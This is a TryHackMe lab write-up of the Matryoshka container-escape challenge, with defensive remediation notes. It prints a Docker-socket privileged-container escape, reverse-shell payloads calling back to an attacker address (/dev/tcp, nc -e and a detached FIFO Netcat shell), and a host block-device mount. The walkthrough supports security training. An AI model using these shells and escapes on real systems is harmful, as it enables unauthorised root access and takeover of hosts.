# Matryoshka Challenge

![Banner](./../IMAGES/matryoshka_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[Matryoshka](https://tryhackme.com/room/matryoshka)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **26 July 2026**.
>
> **Spoiler warning:** This write-up documents the exploitation chain, although credentials, exact challenge-specific values, dynamically generated container identifiers and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, dynamically generated container identifiers, sensitive file contents, exact exploit values or other challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation, container security and defensive security.

Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Matryoshka is a Linux-based container-escape challenge built around a fictional containment unit. The objective was to move through several nested isolation layers, recover the Level 2 and Level 3 flags, then escape to the underlying host and obtain the final host flag.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the target and identifying SSH as the only exposed TCP service.
3. Authenticating to the supplied SSH account.
4. Confirming that the initial shell was running inside a Docker container.
5. Discovering a world-writable Docker socket.
6. Using the Docker client to launch a privileged Alpine container with the parent filesystem mounted.
7. Entering the mounted filesystem with `chroot`.
8. Recovering the Level 2 flag.
9. Discovering a world-writable shared directory containing monitored `inbox` and `outbox` folders.
10. Testing how submitted scripts were executed by the next containment layer.
11. Identifying Netcat as an available networking utility.
12. Starting Penelope on the Kali VM.
13. Submitting a detached FIFO-based Netcat reverse shell through the monitored share.
14. Receiving a root shell inside Level 3.
15. Recovering the Level 3 flag.
16. Enumerating capabilities and mounted filesystems.
17. Identifying the exposed host block device.
18. Mounting the host partition from Level 3.
19. Recovering the final host flag.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: matryoshka.thm
Connection method: SSH
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> matryoshka.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts matryoshka.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

Connectivity was checked with:

```bash
ping -c 6 matryoshka.thm
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms rely on hostname-based routing, virtual hosts, redirects, cookies, certificates or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/matryoshka\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `ping` for confirming target reachability.
- `rustscan` and `nmap` for TCP port, service and script enumeration.
- OpenSSH for connecting to the supplied account.
- Docker CLI for communicating with the exposed Docker daemon.
- Alpine Linux as the locally available container image used during the Docker-socket escape.
- `chroot` for entering a mounted parent filesystem.
- `ls`, `cat`, `find`, `mount`, `grep`, `command`, `printf`, `chmod` and other standard Linux utilities for enumeration and exploitation.
- BusyBox utilities within the Alpine-based containment layers.
- Netcat for the Level 3 reverse shell.
- Penelope for receiving and managing the reverse-shell session.
- Linux procfs for inspecting effective capabilities.
- The `mount` utility for attaching the exposed host partition.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A rapid scan was performed first:

```bash
rustscan -a matryoshka.thm --ulimit 5000 -- -sC -sV -Pn
```

The scan identified one exposed TCP service:

```text
22/tcp open ssh
```

Service detection reported OpenSSH on Ubuntu.

A second Nmap scan confirmed the finding:

```bash
nmap -sC -sV -Pn matryoshka.thm
```

The remaining common TCP ports were filtered, leaving SSH as the only externally exposed service.

### SSH Foothold

The challenge supplied an SSH username and password. These values are intentionally redacted:

```text
Username: <REDACTED>
Password: <REDACTED>
```

The connection was opened with:

```bash
ssh <REDACTED>@matryoshka.thm
```

The identity, working directory and hostname were checked:

```bash
id
whoami
pwd
hostname
```

The shell belonged to the supplied unprivileged account and opened in its home directory.

The hostname resembled a short container identifier:

```text
<REDACTED>
```

This suggested that the SSH service had placed the user directly inside a container rather than on the underlying host.

### Confirming the First Container

The root filesystem was inspected:

```bash
ls -la /
```

The listing contained:

```text
.dockerenv
```

The presence of `/.dockerenv` confirmed that the initial SSH shell was running inside a Docker container.

The Docker socket was then checked:

```bash
ls -la /var/run/docker.sock
```

The important result was:

```text
srw-rw-rw- ... /var/run/docker.sock
```

The socket was world-writable. This meant the unprivileged container user could communicate with the Docker daemon even without membership of the Docker group.

### Docker Client Availability

An initial attempt to query the socket with cURL failed because cURL was not installed.

Available tools were checked with:

```bash
command -v docker wget python3 python nc socat
```

The container provided:

```text
/usr/bin/docker
/usr/bin/wget
/usr/bin/nc
```

The installed Docker client removed the need to communicate with the daemon through raw HTTP requests.

The running containers were listed:

```bash
docker ps -a
```

Only the current Level 1 container was active.

Locally available images were then listed:

```bash
docker images
```

The daemon contained:

```text
matryoshka-level1   local
alpine              3.20
```

The Alpine image provided a suitable base for launching a temporary privileged container.

## Exploits

### Level 1 to Level 2 - Docker Socket Escape

A world-writable Docker socket is effectively equivalent to root-level control of the Docker host managed by that daemon. The user was able to instruct the daemon to create a privileged container and bind-mount the parent filesystem.

The following command launched an Alpine container, mounted the daemon host's root filesystem at `/host`, then entered it with `chroot`:

```bash
docker run --rm -it --privileged -v /:/host alpine:3.20 chroot /host /bin/sh
```

The command options performed the following actions:

- `--rm` removed the temporary container after exit.
- `-it` allocated an interactive terminal.
- `--privileged` granted broad Linux capabilities and device access.
- `-v /:/host` mounted the Docker daemon host's root filesystem at `/host`.
- `chroot /host /bin/sh` changed the apparent filesystem root and launched a shell.

The new shell showed root privileges:

```bash
id
whoami
pwd
```

The effective result was:

```text
uid=0(root)
root
/
```

Because `chroot` changes the filesystem root but not the UTS namespace, the runtime hostname still belonged to the temporary Alpine container. The hostname stored inside the mounted filesystem was therefore checked separately:

```bash
cat /etc/hostname
```

The result was another dynamically generated container identifier, intentionally shown as:

```text
<REDACTED>
```

This confirmed that the mounted filesystem belonged to the next containment layer.

### Level 2 Flag

Likely flag files were searched for:

```bash
find / -maxdepth 3 -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' \) 2>/dev/null
```

The relevant result was:

```text
/root/flag_level2.txt
```

The flag was read with:

```bash
cat /root/flag_level2.txt
```

The Level 2 answer is intentionally redacted:

```text
THM{....}
```

### Investigating the Next Containment Boundary

The Docker socket was still visible from Level 2:

```bash
ls -la /var/run/docker.sock
```

However, listing containers showed the same daemon and the already known Level 1 and temporary Alpine containers:

```bash
docker ps -a
```

This proved that repeatedly abusing the same socket would loop back into the same parent filesystem rather than reach Level 3.

The root user's home directory contained only the Level 2 flag and shell history generated during the current session:

```bash
ls -la /root
cat /root/.ash_history
```

The next useful lead came from `/mnt`:

```bash
ls -la /mnt
```

A world-writable directory was present:

```text
/mnt/level3share
```

Its contents were inspected recursively:

```bash
ls -laR /mnt/level3share
```

The directory contained:

```text
/mnt/level3share/inbox
/mnt/level3share/outbox
```

Both directories were world-writable. This strongly suggested an automated script runner: files placed in `inbox` were collected and executed by a process in another containment layer, while results were written to `outbox`.

### Testing the Level 3 Script Runner

An initial reverse-shell script attempted to use `/dev/tcp`:

```bash
printf '#!/bin/sh\nsh -i >& /dev/tcp/<TUN0_IP>/<REDACTED> 0>&1\n' \
  > /mnt/level3share/inbox/<REDACTED>.sh
```

The file disappeared from `inbox` almost immediately, confirming that a watcher was processing submissions.

The corresponding output file appeared in `outbox`:

```bash
cat /mnt/level3share/outbox/<REDACTED>.sh.out
```

The runner reported that `/dev/tcp` did not exist. This showed that the execution shell did not provide Bash-style TCP redirection.

A harmless discovery script was then submitted to identify available interpreters and networking tools:

```bash
printf '#!/bin/sh\ncommand -v nc netcat ncat socat python3 python perl php bash busybox\n' \
  > /mnt/level3share/inbox/tools.sh
```

The result was read from:

```bash
cat /mnt/level3share/outbox/tools.sh.out
```

The only useful networking utility returned was:

```text
/usr/bin/nc
```

### Netcat Capability Testing

A conventional Netcat `-e` payload was tested next:

```bash
printf '#!/bin/sh\nnc <TUN0_IP> <REDACTED> -e /bin/sh\n' \
  > /mnt/level3share/inbox/<REDACTED>.sh
```

The runner returned:

```text
nc: service "-e" unknown
```

This confirmed that the installed Netcat implementation did not support the `-e` option.

No encoded data, hashes or ciphertext required decoding during this room. The challenge instead depended on filesystem, container, process and capability enumeration.

### Penelope Listener

Penelope was started on the Kali Linux VM:

```bash
penelope -p <REDACTED>
```

The listener bound to all local addresses, including the TryHackMe VPN interface:

```text
[+] Listening for reverse shells on 0.0.0.0:<REDACTED> -> ... <TUN0_IP>
```

Penelope was kept running while the final payload was submitted.

### Level 2 to Level 3 - Detached FIFO Reverse Shell

Because Netcat did not support `-e`, a named-pipe technique was used. The final payload was detached from the monitored runner with `nohup` so that the callback would survive after the watcher completed its job.

The exact filename and port are redacted, while the technique remains visible:

```bash
printf '#!/bin/sh\nnohup sh -c '\''rm -f /tmp/<REDACTED>; mkfifo /tmp/<REDACTED>; cat /tmp/<REDACTED> | /bin/sh -i 2>&1 | nc <TUN0_IP> <REDACTED> > /tmp/<REDACTED>'\'' >/tmp/<REDACTED>.log 2>&1 &\n' \
  > /mnt/level3share/inbox/<REDACTED>.sh
```

The payload worked as follows:

1. Removed any stale named pipe.
2. Created a FIFO with `mkfifo`.
3. Read commands from the FIFO.
4. Passed those commands into `/bin/sh -i`.
5. Redirected standard output and standard error through Netcat.
6. Sent the shell connection to Penelope on `<TUN0_IP>`.
7. Redirected data received from Netcat back into the FIFO.
8. Used `nohup` and background execution to detach the process from the monitored script runner.

Penelope received a new root reverse shell from `<TARGET_IP>`:

```text
[New Reverse Shell] => <REDACTED> <TARGET_IP> Linux-x86_64 root
```

Penelope offered to deploy a standalone Python agent, but Python was not available remotely. The option to continue without an agent was selected.

The resulting session provided a stable interactive shell:

```bash
id
whoami
pwd
```

The identity was:

```text
uid=0(root)
root
/
```

### Level 3 Flag

The Level 3 filesystem was searched:

```bash
find / -maxdepth 3 -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' \) 2>/dev/null
```

The relevant result was:

```text
/root/flag_level3.txt
```

The file was read:

```bash
cat /root/flag_level3.txt
```

The Level 3 answer is intentionally redacted:

```text
THM{....}
```

### Capability Enumeration

The Level 3 process capability masks were inspected:

```bash
grep '^Cap' /proc/self/status
```

The effective, permitted and bounding masks were extremely broad:

```text
CapInh: 0000000000000000
CapPrm: <REDACTED>
CapEff: <REDACTED>
CapBnd: <REDACTED>
CapAmb: 0000000000000000
```

This indicated that the Level 3 container retained dangerous capabilities that are normally removed from unprivileged containers.

### Mounted Filesystem Enumeration

Mounted filesystems were listed:

```bash
mount
```

Several observations were important:

- The container root used OverlayFS.
- `/sys` was writable.
- `/sys/kernel/security` was mounted.
- `/var/lib/docker` was backed by the host filesystem.
- A physical partition was mounted into several container configuration files.
- The exposed host partition appeared as `/dev/nvme0n1p1`.

The block device was confirmed:

```bash
ls -la /dev/nvme0n1p1
```

The output showed a real block device:

```text
brw-rw---- 1 root disk ... /dev/nvme0n1p1
```

Combined with the broad capability mask, this provided the final host-escape route.

### Level 3 to Host - Mounting the Host Partition

A mount point was created:

```bash
mkdir -p /mnt/host
```

The exposed partition was mounted:

```bash
mount /dev/nvme0n1p1 /mnt/host
```

The host root user's home directory was inspected:

```bash
ls -la /mnt/host/root
```

The listing contained:

```text
flag_host.txt
```

The final flag was read:

```bash
cat /mnt/host/root/flag_host.txt
```

The host answer is intentionally redacted:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The allocated target and `tun0` addresses were confirmed. `matryoshka.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring predictable local hostname resolution.

### 2. Service Discovery
RustScan and Nmap identified SSH as the only exposed TCP service. No web application, SMB share or other externally accessible service was required.

### 3. Supplied SSH Access
The room-provided credentials were used to connect to:

```bash
ssh <REDACTED>@matryoshka.thm
```

The exact username and password are omitted from this public write-up.

### 4. Container Identification
The initial hostname resembled a container ID, and `/.dockerenv` confirmed that the SSH foothold was inside Docker.

### 5. Exposed Docker Socket
`/var/run/docker.sock` was world-writable. The installed Docker client could therefore control the daemon without elevated local Unix permissions.

### 6. Privileged Temporary Container
The locally available Alpine image was used to create a privileged container with `/` bind-mounted at `/host`.

### 7. Chroot into Level 2
`chroot /host /bin/sh` entered the mounted parent filesystem as root.

### 8. Level 2 Objective
`/root/flag_level2.txt` was located and read:

```text
THM{....}
```

### 9. Shared Script-Execution Channel
`/mnt/level3share` contained world-writable `inbox` and `outbox` directories. Files placed in `inbox` were consumed by a process in Level 3.

### 10. Runner Behaviour Testing
A `/dev/tcp` payload failed because the execution shell did not support that feature. A tool-discovery script showed that `/usr/bin/nc` was available.

### 11. Netcat Limitation
The installed Netcat did not support `-e`, so a direct executable attachment was not possible.

### 12. Penelope Listener
Penelope was started on the Kali VM and bound to the VPN interface at `<TUN0_IP>`.

### 13. Detached FIFO Payload
A named-pipe Netcat reverse shell was submitted through the Level 3 inbox. `nohup` and background execution prevented the monitored runner from killing the callback when it finished processing the script.

### 14. Level 3 Root Shell
Penelope received a stable root session from `<TARGET_IP>`.

### 15. Level 3 Objective
`/root/flag_level3.txt` was located and read:

```text
THM{....}
```

### 16. Capability and Mount Review
The Level 3 process retained a dangerously broad capability set. Mount enumeration also exposed the host partition as `/dev/nvme0n1p1`.

### 17. Host Partition Mount
The block device was mounted at `/mnt/host`.

### 18. Final Objective
The host flag was recovered from:

```text
/mnt/host/root/flag_host.txt
```

The final answer is intentionally redacted:

```text
THM{....}
```

## Key Lessons

Matryoshka demonstrated several useful penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting a room.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM.
- A shell prompt and hostname can reveal that an initial foothold is inside a container.
- `/.dockerenv` is a simple but useful indicator of Docker containerisation.
- A writable Docker socket should be treated as equivalent to root control of the Docker daemon host.
- Container images already present on the daemon may provide everything required for an escape.
- `chroot` changes the visible filesystem root but does not change every namespace, including the runtime hostname.
- Repeating an escape technique without confirming the controlling daemon can create a loop rather than reach a new layer.
- World-writable shared folders deserve immediate investigation.
- Automated `inbox` and `outbox` patterns often indicate a file-processing or job-execution service.
- Test payload assumptions before relying on them. `/dev/tcp` is not supported by every shell.
- Different Netcat implementations support different options.
- FIFO-based reverse shells remain useful when Netcat lacks `-e`.
- A reverse shell started by a short-lived job runner may die unless it is properly detached.
- Penelope provides useful session handling when working with unstable or minimal shells.
- Root inside a container is not automatically root on the host, but dangerous capabilities and exposed devices can collapse that boundary.
- Capability masks should be inspected during container enumeration.
- Writable sysfs mounts, securityfs access and exposed block devices are major warning signs.
- A host block device mounted from inside a container provides direct filesystem access without requiring a conventional host shell.
- Flags should be documented in discovery order while exact values remain redacted in public write-ups.
- No decoding stage occurred in this challenge; the key work involved container, filesystem, execution-channel and capability analysis.

The most important lesson was that each containment layer failed for a different reason. Level 1 exposed the Docker control socket, Level 2 exposed a trusted script-processing channel, and Level 3 exposed host capabilities and storage. The room rewarded careful re-enumeration after every boundary crossing rather than assuming the same technique would work repeatedly.

## Remediation Notes

### Docker Socket Security

- Never mount `/var/run/docker.sock` into an untrusted or user-accessible container unless there is a documented and strictly controlled requirement.
- Do not make the Docker socket world-writable.
- Restrict socket access to a minimal administrative group.
- Treat membership of the Docker group as root-equivalent.
- Prefer narrowly scoped container-management APIs rather than exposing the raw Docker daemon.
- Use a rootless container runtime where operationally appropriate.
- Monitor for unexpected Docker API requests and privileged container creation.
- Prevent untrusted users from launching containers with bind mounts of `/`.
- Restrict or remove locally available images that are not required.

### Container Privilege Hardening

- Avoid `--privileged` containers.
- Drop all capabilities by default and add back only those that are essential.
- Apply `no-new-privileges`.
- Use a restrictive seccomp profile.
- Use AppArmor or SELinux confinement.
- Run services as non-root users.
- Use read-only root filesystems where possible.
- Prevent access to host devices unless explicitly required.
- Keep `/sys` read-only and do not expose `securityfs` to ordinary workloads.
- Separate container hosts by trust level and function.

### Shared Directory and Job-Runner Security

- Do not execute files automatically from a world-writable directory.
- Require authenticated and authorised job submission.
- Validate file ownership, permissions, extension, content and format.
- Copy submitted files into a private staging location before processing.
- Execute jobs as a dedicated unprivileged user.
- Use a strict allow-list of permitted operations.
- Do not interpret uploaded content directly as shell scripts.
- Apply timeouts, resource limits and sandboxing to every submitted job.
- Prevent submitted jobs from initiating arbitrary outbound network connections.
- Log submission, execution, output and failure events.
- Remove sensitive data from runner output.
- Use separate queues and storage for input and output.
- Randomise internal filenames and prevent path traversal or symbolic-link attacks.

### Reverse-Shell Prevention and Detection

- Restrict outbound traffic from containers to required destinations and ports.
- Alert on unexpected connections from workload containers to VPN or administrative ranges.
- Monitor for creation of FIFOs in `/tmp`.
- Monitor for suspicious command chains involving `mkfifo`, `nc`, `/bin/sh`, `nohup` or background execution.
- Mount temporary directories with appropriate hardening options where possible.
- Use application allow-listing in sensitive execution environments.
- Remove unnecessary networking tools from production containers.

### Capability and Device Security

- Remove `CAP_SYS_ADMIN` and other unnecessary capabilities.
- Do not expose host block devices inside containers.
- Use device cgroup rules to deny access by default.
- Avoid broad capability masks.
- Audit `/proc/self/status` and container runtime configuration during security reviews.
- Keep host partitions inaccessible from workload namespaces.
- Prevent containers from mounting arbitrary filesystems.
- Use separate storage volumes rather than raw host partitions.
- Monitor mount system calls from container processes.
- Alert when workload containers access `/dev/nvme*`, `/dev/sd*` or other host storage devices.

### Host Filesystem Protection

- Encrypt sensitive host storage where practical.
- Keep flags, credentials and secrets out of predictable root-home locations in real environments.
- Apply strict file permissions, but recognise that permissions do not protect data from a process with direct block-device access.
- Use secrets-management services rather than plaintext files.
- Separate container data partitions from the host operating-system partition.
- Regularly audit bind mounts and device mappings.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after each room.
- Maintain separate working directories for scan output, payloads and evidence.
- Record the target, hostname and `tun0` details at the beginning of each engagement.
- Re-enumerate identity, filesystems, mounts, processes, capabilities and network access after every container escape.
- Confirm which Docker daemon or container runtime a socket controls before repeating an escape.
- Preserve command output and timestamps for accurate reporting.
- Redact live credentials, dynamic identifiers and exact flags before publishing.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
